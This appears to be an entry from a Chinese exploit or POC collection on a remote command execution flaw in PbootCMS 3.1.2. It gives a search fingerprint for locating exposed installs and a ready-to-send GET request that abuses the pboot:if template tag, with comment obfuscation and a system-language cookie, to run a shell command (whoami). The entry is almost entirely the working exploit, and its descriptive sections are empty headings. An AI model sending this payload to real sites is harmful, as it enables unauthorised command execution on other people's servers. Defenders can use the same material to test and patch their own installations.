# PbootCMSpboot存在远程命令执行漏洞

- **系统**：PbootCMSpboot　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="PBOOTCMS"`
- **请求**：`GET /index.php/keyword?keyword=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}&backurl=;whoami HTTP/1.1`
- **关键头**：`Cookie: lg=system; PbootSystem=blr2stdputphajekcor68ii671;`

**请求体 / payload**
```
GET /?snakin=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}&backurl=;whoami HTTP/1.1
Host:
Cookie: lg=system; PbootSystem=blr2stdputphajekcor68ii671;
```

**其他**
- PbootCMS pboot存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * PbootCMS 3.1.2